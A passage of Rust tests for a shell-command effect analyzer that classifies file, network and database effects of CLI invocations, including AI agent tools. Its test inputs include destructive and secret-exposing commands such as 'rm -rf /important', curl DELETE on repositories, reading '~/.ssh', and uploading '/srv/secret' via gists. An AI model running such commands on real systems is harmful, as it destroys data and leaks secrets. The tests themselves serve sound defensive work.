                identity: ResourceIdentity::NetworkEndpoint { host, .. }
            } if host == if provider == "github" { "api.github.com" } else { "gitlab.com" }
        ));
        assert_eq!(
            request.request_assurance,
            effinterp_proto::RequestAssurance::Exact
        );
        assert_eq!(request.modality, effinterp_proto::Modality::MustOnSuccess);
        for (name, value) in [
            ("method", "DELETE"),
            ("hosted_provider", provider),
            ("hosted_target_kind", "repository"),
            ("hosted_object_kind", "repository"),
            ("hosted_target", target),
        ] {
            assert_eq!(
                request.attributes.get(name),
                Some(&AttrValue::String(value.into())),
                "{argv:?}: {name}"
            );
        }
        assert_eq!(
            request.attributes.get("delete"),
            Some(&AttrValue::Bool(true)),
            "{argv:?}"
        );
    }

    for argv in [
        &[
            "curl",
            "-X",
            "GET",
            "https://api.github.com/repos/owner/project",
        ][..],
        &[
            "curl",
            "-X",
            "POST",
            "-X",
            "DELETE",
            "https://api.github.com/repos/owner/project",
        ],
        &[
            "curl",
            "-X",
            "DELETE",
            "https://api.github.com/repos/owner/project",
            "https://example.test/second",
        ],
        &[
            "curl",
            "-L",
            "-X",
            "DELETE",
            "https://api.github.com/repos/owner/project",
        ],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "network.delete_request"),
            "{argv:?}"
        );
    }
    for argv in [
        &[
            "curl",
            "-X",
            "DELETE",
            "https://api.github.com.evil/repos/owner/project",
        ][..],
        &[
            "curl",
            "-X",
            "DELETE",
            "https://api.github.com/repos/owner/project/hooks/123",
        ],
    ] {
        let plan = analyze(argv, Some("/work"));
        let request = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "network.delete_request")
            .expect("generic DELETE request");
        assert_eq!(
            request.attributes.get("method"),
            Some(&AttrValue::String("DELETE".into())),
            "{argv:?}"
        );
        assert_eq!(request.attributes.len(), 1, "{argv:?}");
        assert_eq!(
            request.request_assurance,
            effinterp_proto::RequestAssurance::Conservative,
            "{argv:?}"
        );
        assert_eq!(request.modality, effinterp_proto::Modality::May, "{argv:?}");
    }
    let source = "curl -X \"$METHOD\" https://api.github.com/repos/owner/project";
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: source.into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    assert!(
        plan.effects
            .iter()
            .all(|effect| effect.operation.0 != "network.delete_request"),
        "{source}"
    );

    let source = "curl -X DELETE \"$URL\"";
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: source.into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "network.delete_request")
        .expect("symbolic DELETE request");
    assert_eq!(
        request.attributes.get("method"),
        Some(&AttrValue::String("DELETE".into()))
    );
    assert_eq!(request.attributes.len(), 1);
    assert_eq!(
        request.request_assurance,
        effinterp_proto::RequestAssurance::Conservative
    );
    assert_eq!(request.modality, effinterp_proto::Modality::May);
    assert!(matches!(
        &request.resource,
        ResourceExpr::Unresolved { family } if family.0 == "network"
    ));
}

#[test]
fn agent_cli_sessions_stay_partial_while_narrow_and_inert_forms_are_exact() {
    for (cli, session) in [
        ("claude", &["claude", "-p", "fix it"][..]),
        ("codex", &["codex", "exec", "fix it"][..]),
        ("amp", &["amp", "-x", "fix it"][..]),
        ("droid", &["droid", "exec", "fix it"][..]),
        ("cursor-agent", &["cursor-agent", "-p", "fix it"][..]),
        ("pi", &["pi", "-p", "fix it"][..]),
        ("hermes", &["hermes", "-q", "fix it"][..]),
    ] {
        let session = analyze(session, Some("/work"));
        for operation in ["filesystem.read", "environment.read", "network.connect"] {
            assert!(
                session
                    .effects
                    .iter()
                    .any(|effect| effect.operation.0 == operation),
                "{cli} {operation}"
            );
        }
        assert_eq!(session.boundaries.len(), 1, "{cli}");
        let boundary = &session.boundaries[0];
        assert_eq!(boundary.reason.as_str(), "unmodeled_dynamic", "{cli}");
        assert_eq!(boundary.class, BoundaryClass::Unmodeled, "{cli}");
        assert_eq!(
            boundary.detail.as_deref(),
            Some("agent session executes model-selected actions"),
            "{cli}"
        );
        assert_eq!(boundary.domains.len(), 9, "{cli}");

        let version = analyze(&[cli, "--version"], Some("/work"));
        assert!(command_effects(&version).is_empty(), "{cli}");
        assert!(version.boundaries.is_empty(), "{cli}");
    }
}

#[test]
fn devtools_preserve_child_effects_outputs_and_fresh_names() {
    for args in [
        "secret",
        "-e secret",
        "-f patterns",
        "--files",
        "--follow secret",
        "-L secret",
    ] {
        for (target, expected) in [
            (
                "/home/u/.ssh",
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath {
                        path: "/home/u/.ssh".into(),
                    },
                },
            ),
            (
                "\"$TREE\"",
                ResourceExpr::Environment {
                    name: "TREE".into(),
                },
            ),
        ] {
            let source = format!("rg {args} {target}");
            let plan = Engine::new()
                .analyze(&Subject::Shell {
                    source: source.clone(),
                    cwd: Some("/work".into()),
                    context: HostContext::default(),
                })
                .unwrap();
            let read = plan
                .effects
                .iter()
                .find(|effect| {
                    effect.operation.0 == "filesystem.read" && effect.resource == expected
                })
                .unwrap();
            assert_eq!(
                read.attributes.get("recursive"),
                Some(&AttrValue::Bool(true)),
                "{source}"
            );
            assert_eq!(
                read.attributes.get("content_filter"),
                Some(&AttrValue::Bool(true)),
                "{source}"
            );
            assert_eq!(
                plan.coverage.level(&Domain::new("filesystem")),
                Some(CoverageLevel::Full),
                "{source}"
            );
            assert!(plan.boundaries.is_empty(), "{source}");
            assert_eq!(
                read.attributes.get("follow_symlinks") == Some(&AttrValue::Bool(true)),
                args.starts_with("--follow") || args.starts_with("-L"),
                "{source}"
            );
            if args == "-f patterns" {
                let pattern = plan
                    .effects
                    .iter()
                    .find(|effect| {
                        effect.operation.0 == "filesystem.read"
                            && effect.resource
                                == ResourceExpr::Concrete {
                                    identity: ResourceIdentity::FsPath {
                                        path: "/work/patterns".into(),
                                    },
                                }
                    })
                    .unwrap();
                assert!(!pattern.attributes.contains_key("recursive"), "{source}");
            }
        }
    }
    for argv in [vec!["du"], vec!["rg", "TODO"], vec!["rg", "--files"]] {
        for cwd in [Some("/work"), None] {
            let plan = analyze(&argv, cwd);
            let read = plan
                .effects
                .iter()
                .find(|e| e.operation.0 == "filesystem.read")
                .unwrap();
            let expected = match cwd {
                Some(path) => ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path: path.into() },
                },
                None => ResourceExpr::Parameter { name: "cwd".into() },
            };
            assert_eq!(read.resource, expected, "{argv:?}");
            assert_eq!(
                read.attributes.get("recursive"),
                Some(&AttrValue::Bool(true))
            );
            assert!(plan.boundaries.is_empty(), "{argv:?}");
        }
    }
    for argv in [
        vec!["rustc", "--version", "missing.rs"],
        vec!["rustc", "-vV", "missing.rs"],
        vec!["rustc", "--print", "cfg", "missing.rs"],
        vec!["rustc", "--version", "missing.rs", "-o", "/srv/output"],
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(command_effects(&plan).is_empty(), "{argv:?}");
        assert!(plan.boundaries.is_empty(), "{argv:?}");
    }
    for (argv, operation, resource) in [
        (
            vec!["taskset", "-c", "0", "rg", "TODO", "src"],
            "filesystem.read",
            "/work/src",
        ),
        (
            vec!["chrt", "-f", "10", "rg", "TODO", "src"],
            "filesystem.read",
            "/work/src",
        ),
        (
            vec!["ionice", "rm", "-rf", "/srv/x"],
            "filesystem.delete",
            "/srv/x",
        ),
        (
            vec!["unbuffer", "rg", "-n", "TODO", "src"],
            "filesystem.read",
            "/work/src",
        ),
        (
            vec!["/usr/bin/time", "-o", "/srv/timing.log", "true"],
            "filesystem.write",
            "/srv/timing.log",
        ),
        (
            vec!["xxd", "input", "output"],
            "filesystem.write",
            "/work/output",
        ),
        (
            vec!["xxd", "-r", "input", "output"],
            "filesystem.write",
            "/work/output",
        ),
        (
            vec!["gh", "release", "download", "--dir", "/srv/artifacts"],
            "filesystem.write",
            "/srv/artifacts",
        ),
        (
            vec!["gh", "run", "download", "-D", "/srv/artifacts"],
            "filesystem.write",
            "/srv/artifacts",
        ),
        (
            vec!["gh", "run", "download", "-D", "artifacts"],
            "filesystem.write",
            "/work/artifacts",
        ),
        (
            vec!["getent", "-s", "files", "passwd", "root"],
            "filesystem.read",
            "/etc/passwd",
        ),
        (
            vec!["getent", "-i", "hosts", "localhost"],
            "filesystem.read",
            "/etc/hosts",
        ),
        (
            vec![
                "glab",
                "release",
                "download",
                "v1",
                "--dir",
                "/srv/artifacts",
            ],
            "filesystem.write",
            "/srv/artifacts",
        ),
        (
            vec!["glab", "release", "download", "v1", "-D", "artifacts"],
            "filesystem.write",
            "/work/artifacts",
        ),
        (
            vec!["glab", "api", "--input", "/srv/body.json", "endpoint"],
            "filesystem.read",
            "/srv/body.json",
        ),
        (
            vec!["glab", "api", "--field", "body=@/srv/body.json", "endpoint"],
            "filesystem.read",
            "/srv/body.json",
        ),
        (
            vec!["mktemp", "-p", "/safe", "job.XXXXXX"],
            "filesystem.create",
            "pat:/safe/job.*",
        ),
        (
            vec!["gh", "gist", "create", "/srv/secret"],
            "filesystem.read",
            "/srv/secret",
        ),
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            has_effect(&plan, operation, resource),
            "{argv:?}: {:?}",
            ops(&plan)
        );
        assert!(
            plan.boundaries.is_empty(),
            "{argv:?}: {:?}",
            plan.boundaries
        );
    }
    for argv in [
        vec!["glab", "api", "--input", "-", "endpoint"],
        vec!["gh", "gist", "edit", "123", "/srv/secret"],
        vec!["gh", "ssh-key", "add", "/srv/key.pub"],
        vec!["gh", "gpg-key", "add", "/srv/key.pub"],
        vec!["gh", "release", "create", "v1", "/srv/artifact"],
        vec!["glab", "snippet", "create", "/srv/secret"],
        vec!["glab", "release", "create", "v1", "/srv/artifact"],
        vec!["glab", "variable", "create", "TOKEN"],
        vec!["glab", "variable", "set", "TOKEN"],
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|e| e.operation.0 == "network.upload")
        );
        assert!(
            plan.boundaries.iter().any(|b| {
                b.class == BoundaryClass::Unmodeled
                    && b.domains.contains(&Domain::new("filesystem"))
                    && b.domains.contains(&Domain::new("network"))
            }),
            "{argv:?}"
        );
        assert_ne!(
            plan.coverage.level(&Domain::new("filesystem")),
            Some(CoverageLevel::Full)
        );
    }
    for argv in [
        vec!["gh", "secret", "set", "TOKEN"],
        vec!["gh", "variable", "set", "TOKEN"],
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(
            plan.effects
                .iter()
                .any(|e| e.operation.0 == "network.upload")
        );
        assert!(
            plan.boundaries.is_empty(),
            "{argv:?}: {:?}",
            plan.boundaries
        );
        assert_eq!(
            plan.coverage.level(&Domain::new("filesystem")),
            Some(CoverageLevel::Full)
        );
    }
    for (args, writes) in [
        (vec![], true),
        (vec!["--emit", "files"], true),
        (vec!["--emit", "stdout"], false),
        (vec!["--check"], false),
        (vec!["--check", "--emit", "files"], false),
        (vec!["--version"], false),
    ] {
        let mut argv = vec!["rustfmt", "src/main.rs"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/work"));
        assert_eq!(
            has_effect(&plan, "filesystem.write", "/work/src/main.rs"),
            writes,
            "{argv:?}"
        );
        assert!(plan.boundaries.is_empty(), "{argv:?}");
    }
    for (args, output) in [
        (vec![], Some("/work/main")),
        (vec!["-o", "/srv/program"], Some("/srv/program")),
        (vec!["-o", "-"], None),
    ] {
        let mut argv = vec!["rustc", "src/main.rs"];
        argv.extend(args);
        let plan = analyze(&argv, Some("/work"));
        assert!(has_effect(&plan, "filesystem.read", "/work/src/main.rs"));
        let writes: Vec<_> = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.write")
            .collect();
        assert_eq!(writes.len(), usize::from(output.is_some()), "{argv:?}");
        if let Some(output) = output {
            assert!(has_effect(&plan, "filesystem.write", output), "{argv:?}");
        }
        assert!(plan.boundaries.is_empty(), "{argv:?}");
    }
    for source in [
        "rustc --emit=metadata=/srv/out.rmeta src/main.rs",
        "rustc --emit=metadata=/srv/out.rmeta -o /srv/other src/main.rs",
        r#"rustc --emit="metadata=$OUT" src/main.rs"#,
        r#"rustc --emit="metadata=$OUT" -o /srv/other src/main.rs"#,
        "rustc --emit=link,metadata=/srv/out.rmeta src/main.rs",
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/work".into()),
                context: Default::default(),
            })
            .unwrap();
        assert!(
            has_effect(&plan, "filesystem.read", "/work/src/main.rs"),
            "{source}"
        );
        assert!(
            !has_effect(&plan, "filesystem.write", "/work/main"),
            "{source}"
        );
        assert!(
            !has_effect(&plan, "filesystem.write", "/srv/other"),
            "{source}"
        );
        assert!(
            plan.boundaries
                .iter()
                .any(|b| b.class == BoundaryClass::Unmodeled
                    && b.domains.contains(&Domain::new("filesystem"))),
            "{source}"
        );
        assert_ne!(
            plan.coverage.level(&Domain::new("filesystem")),
            Some(CoverageLevel::Full),
            "{source}"
        );
    }
    for source in [
        r#"rustfmt --emit "$MODE" src/main.rs"#,
        r#"rustfmt --check --emit "$MODE" src/main.rs"#,
        "rustfmt --emit unreviewed src/main.rs",
        r#"rustfmt --check --config-path /srv/rustfmt.toml src/main.rs"#,
        r#"rustfmt --check --config-path "$CONFIG" src/main.rs"#,
        "gh workflow run build -F data=@/srv/secret",
        "gh variable set -f /srv/vars",
        "glab mr create -F /srv/body",
        "glab release download v1 -d /srv/artifacts",
        "glab ci download --dir /srv/artifacts",
        "glab pipeline download --dir /srv/artifacts",
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/work".into()),
                context: Default::default(),
            })
            .unwrap();
        assert!(!plan.boundaries.is_empty(), "{source}");
        assert_ne!(
            plan.coverage.level(&Domain::new("filesystem")),
            Some(CoverageLevel::Full),
            "{source}"
        );
    }
    let destination = Engine::new()
        .analyze(&Subject::Shell {
            source: r#"glab release download v1 --dir "$OUT""#.into(),
            cwd: Some("/work".into()),
            context: Default::default(),
        })
        .unwrap();
    assert!(
        destination
            .effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.write"
                && e.resource == ResourceExpr::Environment { name: "OUT".into() })
    );
    assert!(destination.boundaries.is_empty());
    let file = analyze(&["file", "-f", "paths.txt"], Some("/work"));
    assert!(has_effect(&file, "filesystem.read", "/work/paths.txt"));
    assert!(
        file.boundaries
            .iter()
            .any(|b| b.reason.as_str() == "input_determined_arguments"
                && b.class == BoundaryClass::Unresolved)
    );
    for argv in [
        vec!["seq", "10"],
        vec!["seq", "1", "10"],
        vec!["seq", "1", "2", "10"],
    ] {
        let plan = analyze(&argv, Some("/work"));
        assert!(command_effects(&plan).is_empty());
        assert!(plan.boundaries.is_empty());
    }
}

#[test]
fn agent_scopes_target_mcp_storage_and_prompt_words_stay_sessions() {
    for (args, target) in [
        (vec!["--scope", "project"], "/work/.mcp.json"),
        (vec!["--scope", "user"], "$HOME/.claude.json"),
        (vec!["--scope", "local"], "$HOME/.claude.json"),
        (vec![], "$HOME/.claude.json"),
    ] {
        let argv = [
            vec!["claude", "mcp", "add"],
            args,
            vec!["server", "command"],
        ]
        .concat();
        let plan = analyze(&argv, Some("/work"));
        let writes = command_effects(&plan);
        assert_eq!(writes.len(), 1, "{argv:?}");
        assert_eq!(writes[0].operation.0, "filesystem.write");
        let resource = serde_json::to_string(&writes[0].resource).unwrap();
        if target.starts_with("$HOME") {
            assert!(
                resource.contains("HOME") && resource.contains(".claude.json"),
                "{resource}"
            );
        } else {
            assert!(has_effect(&plan, "filesystem.write", target));
        }
        assert!(plan.boundaries.is_empty());
    }
    for word in ["status", "doctor", "hello"] {
        let plan = analyze(&["pi", word], Some("/work"));
        assert_eq!(plan.boundaries.len(), 1);
        assert!(has_boundary(&plan, "unmodeled_dynamic"));
        assert!(plan.effects.iter().any(|e| {
            e.operation.0 == "filesystem.read"
                && serde_json::to_string(&e.resource)
                    .unwrap()
                    .contains(".pi/agent/settings.json")
        }));
    }
    let status = analyze(&["codex", "login", "status"], Some("/work"));
    assert!(command_effects(&status).is_empty());
    assert!(status.boundaries.is_empty());
}

#[test]
fn uncertain_cli_selectors_and_explicit_unsets_preserve_coverage() {
    for (source, domain) in [
        ("gh api -X \"$METHOD\" repos/o/r", "network"),
        ("glab api -X \"$METHOD\" projects/1", "network"),
        ("gh api -X HEAD repos/o/r", "network"),
        ("glab api -X HEAD projects/1", "network"),
        (
            "claude config set --scope \"$SCOPE\" theme dark",
            "filesystem",
        ),
        (
            "claude config set --scope unsupported theme dark",
            "filesystem",
        ),
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/work".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(!plan.boundaries.is_empty(), "{source}");
        assert_ne!(
            plan.coverage.0[&Domain::new(domain)].level,
            CoverageLevel::Full,
            "{source}"
        );
    }
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: "unset GH_HOST; gh pr list".into(),
            cwd: Some("/work".into()),
            context: HostContext {
                env: std::collections::BTreeMap::from([("GH_HOST".into(), "old.example".into())]),
                ..HostContext::default()
            },
        })
        .unwrap();
    assert!(has_network_host(&plan, "network.request", "github.com"));
    let symbolic = Engine::new()
        .analyze(&Subject::Shell {
            source: "GH_HOST=\"$OTHER\"; gh pr list".into(),
            cwd: Some("/work".into()),
            context: HostContext {
                env: std::collections::BTreeMap::from([("GH_HOST".into(), "old.example".into())]),
                ..HostContext::default()
            },
        })
        .unwrap();
    assert!(!has_network_host(
        &symbolic,
        "network.request",
        "github.com"
    ));
    assert!(!has_network_host(
        &symbolic,
        "network.request",
        "old.example"
    ));
    assert!(
        symbolic
            .effects
            .iter()
            .any(|e| e.operation.0 == "network.request")
    );
    let extension = analyze(&["gh", "customverb", "foo"], Some("/work"));
    assert_eq!(extension.boundaries.len(), 1);
    assert_eq!(
        extension.boundaries[0].reason.as_str(),
        "unmodeled_subcommand"
    );
    assert_eq!(
        extension.boundaries[0]
            .domains
            .iter()
            .map(|d| d.0.as_str())
            .collect::<BTreeSet<_>>(),
        BTreeSet::from(["network", "process"])
    );
}

#[test]
fn effectful_p11_miss_surfaces_emit_only_their_reviewed_facts() {
    for (argv, operation, resource) in [
        (
            &["gtar", "-cf", "/tmp/archive.tar", "src"][..],
            "filesystem.write",
            "/tmp/archive.tar",
        ),
        (
            &["jq", "-r", ".name", "/work/input.json"][..],
            "filesystem.read",
            "/work/input.json",
        ),
        (
            &["install", "/work/tool", "/usr/local/bin/tool"][..],
            "filesystem.write",
            "/usr/local/bin/tool",
        ),
        (
            &["hub", "pull-request", "-m", "release"][..],
            "network.request",
            "?network",
        ),
        (
            &["readlink", "-f", "/work/link"][..],
            "filesystem.metadata",
            "/work/link",
        ),
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_effect(&plan, operation, resource), "{argv:?}");
        assert!(!has_boundary(&plan, "unmodeled_command"), "{argv:?}");
    }
}

#[test]
fn gtar_extract_supports_the_reviewed_tar_flags() {
    let plan = analyze(
        &[
            "gtar",
            "-xzf",
            "a.tgz",
            "-C",
            "/tmp",
            "--strip-components",
            "1",
        ],
        Some("/work"),
    );
    assert!(has_effect(&plan, "filesystem.read", "/work/a.tgz"));
    assert!(has_effect(&plan, "filesystem.write", "pat:/tmp/*"));
    assert!(!has_boundary(&plan, "unrecognized_arguments"));

    let plan = analyze(&["gtar", "-xzf", "a.tgz"], Some("/work"));
    assert!(has_effect(&plan, "filesystem.read", "/work/a.tgz"));
    assert!(has_effect(&plan, "filesystem.write", "pat:/work/*"));
    assert!(!has_boundary(&plan, "unrecognized_arguments"));
}

#[test]
fn install_target_directory_writes_each_source_basename() {
    let plan = analyze(
        &["install", "-t", "/usr/local/bin", "a", "b"],
        Some("/work"),
    );
    for source in ["/work/a", "/work/b"] {
        assert!(has_effect(&plan, "filesystem.read", source));
    }
    for destination in ["/usr/local/bin/a", "/usr/local/bin/b"] {
        assert!(has_effect(&plan, "filesystem.write", destination));
    }
    assert!(!has_effect(&plan, "filesystem.write", "/work/b"));
    assert!(!has_boundary(&plan, "unrecognized_arguments"));

    let plan = analyze(
        &["install", "/work/a", "/work/b", "/usr/local/bin"],
        Some("/work"),
    );
    for destination in ["/usr/local/bin/a", "/usr/local/bin/b"] {
        assert!(has_effect(&plan, "filesystem.write", destination));
    }
    assert!(!has_effect(&plan, "filesystem.write", "/usr/local/bin"));
}

#[test]
fn promoted_transfer_endpoints_are_structured() {
    for (argv, operation, endpoint) in [
        (
            &["aria2c", "https://downloads.example.net/archive.bin"][..],
            "network.download",
            "net:https://downloads.example.net/archive.bin",
        ),
        (
            &["axel", "https://downloads.example.net/archive.bin"][..],
            "network.download",
            "net:https://downloads.example.net/archive.bin",
        ),
        (
            &["http", "https://api.example.net/v1/items"][..],
            "network.request",
            "net:https://api.example.net/v1/items",
        ),
        (
            &["sftp", "user@files.example.net:/remote/archive.bin"][..],
            "network.connect",
            "net:files.example.net/remote/archive.bin",
        ),
        (
            &[
                "rclone",
                "copyurl",
                "https://downloads.example.net/archive.bin",
                "/work/archive.bin",
            ][..],
            "network.download",
            "net:https://downloads.example.net/archive.bin",
        ),
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_effect(&plan, operation, endpoint), "{argv:?}");
    }
}

#[test]
fn url_root_downloads_use_the_host_as_the_default_destination() {
    for argv in [
        &["aria2c", "https://example.com/"][..],
        &["axel", "https://example.com/"][..],
        &["hg", "clone", "https://example.com/"][..],
        &["svn", "checkout", "https://example.com/"][..],
        &["fossil", "clone", "https://example.com/"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            has_effect(&plan, "filesystem.write", "/work/example.com"),
            "{argv:?}"
        );
        assert!(!has_effect(&plan, "filesystem.write", "/"), "{argv:?}");
    }
}

#[test]
fn aria2c_local_metadata_is_read_without_becoming_an_endpoint_or_output() {
    for input in ["file.torrent", "downloads.metaLINK"] {
        let plan = analyze(&["aria2c", input], Some("/work"));
        assert!(has_effect(
            &plan,
            "filesystem.read",
            &format!("/work/{input}")
        ));
        assert!(has_effect(&plan, "network.download", "?network"));
        assert!(has_effect(&plan, "filesystem.write", "?filesystem"));
        assert!(!has_effect(
            &plan,
            "filesystem.write",
            &format!("/work/{input}")
        ));
        assert!(plan.effects.iter().all(|effect| {
            effect.operation.0 != "network.download"
                || !matches!(&effect.resource, ResourceExpr::Concrete { .. })
        }));
    }
}

#[test]
fn promoted_destructive_and_symbolic_targets_are_disclosed() {
    let dropdb = analyze(&["dropdb", "old_app"], Some("/work"));
    assert!(has_effect(&dropdb, "database.schema_drop", "db:"));
    assert!(!has_effect(&dropdb, "database.write", "db:"));
    // An unknown flag may take --help as its value, so the drop still runs.
    let dropdb = analyze(&["dropdb", "--bogus", "--help", "old_app"], Some("/work"));
    assert!(has_effect(&dropdb, "database.schema_drop", "db:"));
    assert!(has_boundary(&dropdb, "unrecognized_arguments"));

    // Whole-database drops and restores that drop objects first carry the
    // attributes a database guard selects on.
    let database = |database: &str| ResourceIdentity::DatabaseSchema {
        server: Some("db.example.com".into()),
        database: Some(database.into()),
        schema: None,
    };
    let attribute = |plan: &Plan, operation: &str, key: &str| {
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == operation)
            .map(|effect| (effect.resource.clone(), effect.attributes.get(key).cloned()))
            .collect::<Vec<_>>()
    };
    let text = |value: &str| Some(AttrValue::String(value.into()));
    for argv in [
        &["dropdb", "-h", "db.example.com", "--if-exists", "app"][..],
        &[
            "mysqladmin",
            "-h",
            "db.example.com",
            "-psecret",
            "-f",
            "drop",
            "app",
        ][..],
    ] {
        assert_eq!(
            attribute(
                &analyze(argv, Some("/work")),
                "database.schema_drop",
                "object_kind"
            ),
            [(
                ResourceExpr::Concrete {
                    identity: database("app")
                },
                text("database")
            )],
            "{argv:?}"
        );
    }
    let restore = &[
        "pg_restore",
        "--clean",
        "-h",
        "db.example.com",
        "-d",
        "app",
        "a.dump",
    ];
    assert_eq!(
        attribute(
            &analyze(restore, Some("/work")),
            "database.schema_drop",
            "object_kind"
        ),
        [(
            ResourceExpr::Concrete {
                identity: database("app")
            },
            text("database_objects")
        )]
    );
    // With --create the archive names the dropped database; -d only connects.
    let recreate = analyze(
        &["pg_restore", "-cC", "-d", "postgres", "a.dump"],
        Some("/work"),
    );
    assert!(matches!(
        &attribute(&recreate, "database.schema_drop", "object_kind")[..],
        [(ResourceExpr::Unresolved { .. }, kind)] if *kind == text("database")
    ));
    for argv in [
        &["pg_restore", "-d", "app", "a.dump"][..],
        &["pg_restore", "--clean", "-f", "out.sql", "a.dump"][..],
    ] {
        assert!(
            attribute(
                &analyze(argv, Some("/work")),
                "database.schema_drop",
                "object_kind"
            )
            .is_empty(),
            "{argv:?}"
        );
    }
    let query = [
        "bq",
        "query",
        "--destination_table=p:ds.t",
        "--replace",
        "SELECT 1",
    ];
    assert_eq!(
        attribute(&analyze(&query, Some("/work")), "database.write", "action"),
        [(
            ResourceExpr::Concrete {
                identity: ResourceIdentity::DatabaseTable {
                    server: None,
                    database: Some("p".into()),
                    schema: Some("ds".into()),
                    table: "t".into(),
                }
            },
            text("overwrite")
        )]
    );
    let dry_run = analyze(
        &["bq", "query", "--dry_run", "DROP TABLE ds.t"],
        Some("/work"),
    );
    assert!(
        dry_run
            .effects
            .iter()
            .all(|effect| !effect.operation.0.starts_with("database."))
    );

    let ansible = analyze(&["ansible", "all", "-m", "ping"], Some("/work"));
    assert!(has_effect(&ansible, "network.request", "?network"));
    assert!(!has_effect(&ansible, "network.request", "net:all"));
}

#[test]
fn lz4_distinguishes_input_and_output_operands() {
    let plan = analyze(&["lz4", "/work/input", "/work/output"], Some("/work"));
    assert!(has_effect(&plan, "filesystem.read", "/work/input"));
    assert!(has_effect(&plan, "filesystem.write", "/work/output"));
    assert!(!has_effect(&plan, "filesystem.read", "/work/output"));
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.write")
            .count(),
        1
    );
}

#[test]
fn promoted_default_forms_do_not_become_silent() {
    for (argv, operation, resource) in [
        (&["npx", "eslint"][..], "network.download", "?network"),
        (&["redis-benchmark"][..], "network.request", "net:localhost"),
        (&["ansible", "all"][..], "network.request", "?network"),
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(has_effect(&plan, operation, resource), "{argv:?}");
        assert!(!has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }
}

#[test]
fn package_registry_selection_remains_unresolved() {
    for argv in [
        &["composer", "require", "vendor/package:^1.2"][..],
        &["deno", "install", "npm:cowsay"][..],
        &["bun", "install"][..],
        &["poetry", "add", "requests"][..],
        &["uv", "pip", "install", "requests"][..],
        &["pipenv", "install", "requests"][..],
        &["gem", "install", "rails"][..],
        &["bundle", "add", "rack"][..],
        &["nuget", "install", "Newtonsoft.Json"][..],
        &["dotnet", "restore"][..],
        &["mix", "deps.get"][..],
        &["rebar3", "compile"][..],
        &["npx", "eslint"][..],
    ] {
        let plan = analyze(argv, Some("/work"));
        assert!(
            has_effect(&plan, "network.download", "?network"),
            "{argv:?}"
        );
        assert!(plan.effects.iter().all(|effect| {
            effect.operation.0 != "network.download"
                || !matches!(&effect.resource, ResourceExpr::Concrete { .. })
        }));
    }
}

#[test]
fn configurable_hub_endpoint_remains_unresolved() {
    let plan = analyze(&["hub", "pull-request"], Some("/work"));
    assert!(has_effect(&plan, "network.request", "?network"));
    assert!(plan.effects.iter().all(|effect| {
        effect.operation.0 != "network.request"
            || !matches!(&effect.resource, ResourceExpr::Concrete { .. })
    }));
}

#[test]
fn unsupported_getent_forms_preserve_surrounding_effects() {
    for source in [
        "getent",
        "getent --version",
        "getent -h",
        "getent help",
        "getent ahosts example.com",
        "getent networks",
        "getent initgroups u",
        "getent foo bar",
        "getent -- foo",
        "getent -s files ahosts example.com",
        r#"getent "$DB" root"#,
        "getent $DB",
        r#"echo x | getent "$DB""#,
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: format!("{source}; rm -rf /important"),
                cwd: Some("/work".into()),
                context: Default::default(),
            })
            .unwrap_or_else(|error| panic!("{source}: {error}"));
        validate_plan(&plan).unwrap();
        assert!(
            has_effect(&plan, "filesystem.delete", "/important"),
            "{source}"
        );
        assert!(
            plan.effects
                .iter()
                .all(|effect| effect.operation.0 != "filesystem.read"),
            "{source}"
        );
        assert!(
            plan.boundaries.iter().any(|boundary| {
                boundary.reason.as_str() == "unrecognized_arguments"
                    && boundary.class == BoundaryClass::Unmodeled
                    && boundary.domains == vec![Domain::new("filesystem"), Domain::new("process")]
            }),
            "{source}"
        );
        assert_eq!(
            plan.coverage.0[&Domain::new("filesystem")].level,
            CoverageLevel::Partial,
            "{source}"
        );
    }
}

#[test]
fn unsupported_promoted_forms_use_declared_domains() {
    for (argv, reason, expected_class, expected_domains) in [
        (
            &["helm", "install", "release", "./chart"][..],
            "unrecognized_arguments",
            BoundaryClass::Unmodeled,
            &["container", "process"][..],
        ),
        (
            &["fish", "-c", "gcloud compute instances delete x"][..],
            "dynamic_source",
            BoundaryClass::Unresolved,
            &["environment", "filesystem", "network", "process"][..],
        ),
        (
            &["swift", "build"][..],
            "unmodeled_subcommand",
            BoundaryClass::Unmodeled,
            &["process"][..],
        ),
    ] {
        let plan = analyze(argv, Some("/work"));
        let boundary = plan
            .boundaries
            .iter()
            .find(|boundary| boundary.reason.as_str() == reason)
            .unwrap_or_else(|| panic!("missing {reason} boundary for {argv:?}"));
        assert_eq!(boundary.class, expected_class, "{argv:?}");
        let domains = boundary
            .domains
            .iter()
            .map(|domain| domain.0.as_str())
